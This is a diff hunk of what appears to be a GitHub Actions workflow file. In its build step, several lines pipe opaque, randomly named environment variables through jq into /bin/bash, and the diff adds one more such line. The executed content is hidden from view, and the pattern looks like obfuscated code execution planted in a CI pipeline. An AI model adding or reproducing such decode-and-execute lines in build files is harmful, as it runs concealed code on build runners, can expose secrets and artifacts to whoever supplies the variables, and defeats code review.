@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$poh00221" | jq -r .ot672 | /bin/bash
           echo $yspv1800 | jq -r .fxp269 | /bin/bash
           echo $sdy13 | jq -r .apnws244 | /bin/bash
+          echo $ssop9 | jq -r .su973 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
